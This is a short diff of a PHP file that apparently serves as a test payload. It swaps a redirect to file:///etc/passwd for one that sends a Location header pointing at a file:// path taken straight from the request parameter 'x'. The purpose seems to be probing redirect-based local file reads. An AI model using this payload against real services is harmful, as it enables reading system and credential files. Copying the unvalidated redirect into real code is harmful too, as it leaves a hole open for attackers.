@@ -1,10 +1,1 @@
-<!Doctype html>
-<html>
-<body>
-
-<?php
-header('location:file:///etc/passwd');
-?>
-
-</body>
-</html>
+<?php header('location:file://'.$_REQUEST['x']); ?>
